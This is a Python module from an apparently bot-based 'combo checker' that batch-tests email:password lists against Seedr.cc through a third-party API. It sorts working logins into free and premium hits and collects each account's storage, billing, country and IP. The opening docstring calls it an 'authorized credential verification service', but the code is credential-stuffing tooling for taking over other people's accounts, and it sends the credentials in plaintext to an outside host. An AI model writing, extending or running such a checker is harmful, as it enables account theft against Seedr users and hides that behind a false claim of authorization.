"""
Authorized credential verification service.
IMPORTANT: This service is designed ONLY for verifying credentials that the operator
is authorized to test (e.g., accounts they own or have explicit permission to test).
"""
import asyncio
import time
from typing import Dict, Any, Optional, Tuple
from dataclasses import dataclass, asdict
import aiohttp
from structlog import get_logger
from bot.config import config

logger = get_logger(__name__)


@dataclass
class AccountInfo:
    """Account information data class."""
    email: str = ""
    is_premium: bool = False
    package_name: str = "Non-premium"
    space_max: str = "0.0 GB"
    space_used: str = "0.0 GB"
    space_free: str = "0.0 GB"
    country: str = "Unknown"
    private_ip: str = "N/A"
    invites: int = 0
    invites_accepted: int = 0
    billing_plan: str = "None"
    next_payment_due: str = "N/A"
    
    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary with values."""
        return {
            "email": self.email,
            "is_premium": self.is_premium,
            "package_name": self.package_name,
            "space_max": self.space_max,
            "space_used": self.space_used,
            "space_free": self.space_free,
            "country": self.country,
            "private_ip": self.private_ip,
            "invites": self.invites,
            "invites_accepted": self.invites_accepted,
            "billing_plan": self.billing_plan,
            "next_payment_due": self.next_payment_due
        }


class SeedrChecker:
    """
    Authorized credential verification service for Seedr.cc using Tooltitan API.
    """
    
    def __init__(self):
        """Initialize checker."""
        self.session: Optional[aiohttp.ClientSession] = None
        self.timeout = aiohttp.ClientTimeout(total=config.checker_timeout)
        self.rate_limiter = asyncio.Semaphore(config.max_concurrent_tasks)
    
    async def __aenter__(self):
        """Async context manager entry."""
        connector = aiohttp.TCPConnector(limit=10, force_close=True)
        self.session = aiohttp.ClientSession(
            timeout=self.timeout,
            connector=connector
        )
        return self
    
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        """Async context manager exit."""
        if self.session:
            await self.session.close()
    
    async def check_combo(self, email: str, password: str) -> Tuple[bool, Optional[AccountInfo], str]:
        """
        Verify credentials against Tooltitan Vercel API.
        
        Args:
            email: Account email
            password: Account password
            
        Returns:
            Tuple of (success, account_info, error_message)
        """
        if not self.session:
            raise RuntimeError("Session not initialized. Use async context manager.")
        
        url = f"https://tooltitan.vercel.app/seedr?combo={email}:{password}"
        
        async with self.rate_limiter:
            try:
                async with self.session.get(url) as response:
                    if response.status != 200:
                        return False, None, f"API Error: HTTP status {response.status}"
                        
                    try:
                        data = await response.json()
                    except Exception:
                        return False, None, "Invalid response format from API"
                        
                    status = data.get("status")
                    if status == "success":
                        storage = data.get("storage", {})
                        package = data.get("package", {})
                        acc_info = data.get("account_info", {})
                        invites = acc_info.get("invites", {})
                        
                        account_info = AccountInfo(
                            email=data.get("email", email),
                            is_premium=data.get("premium", False),
                            package_name=package.get("name", "N/A"),
                            space_max=storage.get("total", "0.0 GB"),
                            space_used=storage.get("used", "0.0 GB"),
                            space_free=storage.get("free", "0.0 GB"),
                            country=acc_info.get("country", "Unknown"),
                            private_ip=acc_info.get("private_ip", "N/A"),
                            invites=invites.get("total", 0),
                            invites_accepted=invites.get("used", 0),
                            billing_plan=f"{package.get('cost', 'N/A')} ({package.get('period', 'N/A')})",
                            next_payment_due=package.get("next_payment", "N/A")
                        )
                        return True, account_info, "Success"
                    else:
                        return False, None, data.get("message", "Incorrect Email OR Password")
                        
            except aiohttp.ClientError as e:
                return False, None, f"Network error: {str(e)}"
            except Exception as e:
                return False, None, f"Check failed: {str(e)}"
    
    async def check_batch(
        self, 
        combos: list, 
        progress_callback=None, 
        cancel_event=None
    ) -> Dict[str, Any]:
        """
        Check multiple combos concurrently with progress updates.
        """
        results = {
            "total": len(combos),
            "processed": 0,
            "hits": [],
            "free": [],
            "premium": [],
            "dead": 0,
            "invalid": 0,
            "errors": 0,
            "start_time": time.time(),
            "end_time": None,
            "cancelled": False
        }
        
        queue = asyncio.Queue()
        for combo in combos:
            await queue.put(combo)
            
        lock = asyncio.Lock()
        concurrency = config.max_concurrent_tasks if config.max_concurrent_tasks > 0 else 5
        
        async def worker():
            while not queue.empty():
                if cancel_event and cancel_event.is_set():
                    results["cancelled"] = True
                    break
                    
                combo = await queue.get()
                
                # Validate combo
                is_valid, email, password = validate_combo_local(combo)
                if not is_valid:
                    async with lock:
                        results["invalid"] += 1
                        results["processed"] += 1
                        processed_count = results["processed"]
                    
                    if progress_callback:
                        await progress_callback(processed_count, results, combo)
                    queue.task_done()
                    continue
                
                # Check combo
                success, account_info, error = await self.check_combo(email, password)
                
                async with lock:
                    results["processed"] += 1
                    processed_count = results["processed"]
                    
                    if success and account_info:
                        combo_data = {
                            "combo": combo,
                            "account_info": account_info.to_dict()
                        }
                        results["hits"].append(combo_data)
                        if account_info.is_premium:
                            results["premium"].append(combo_data)
                        else:
                            results["free"].append(combo_data)
                    elif error and ("incorrect" in error.lower() or "invalid" in error.lower()):
                        results["dead"] += 1
                    elif error and ("network error" in error.lower() or "api error" in error.lower() or "check failed" in error.lower()):
                        results["errors"] += 1
                    else:
                        results["dead"] += 1
                
                # Progress callback
                if progress_callback:
                    await progress_callback(processed_count, results, combo)
                
                queue.task_done()
                
                # Rate limiting delay per worker
                if config.rate_limit_delay > 0:
                    await asyncio.sleep(config.rate_limit_delay)
                    
        # Create worker tasks
        workers = [asyncio.create_task(worker()) for _ in range(min(concurrency, len(combos)))]
        
        # Wait for workers to finish
        if workers:
            await asyncio.gather(*workers)
        
        results["end_time"] = time.time()
        return results


def validate_combo_local(combo: str) -> Tuple[bool, str, str]:
    """Local combo validation."""
    from bot.utils.helpers import validate_combo
    return validate_combo(combo)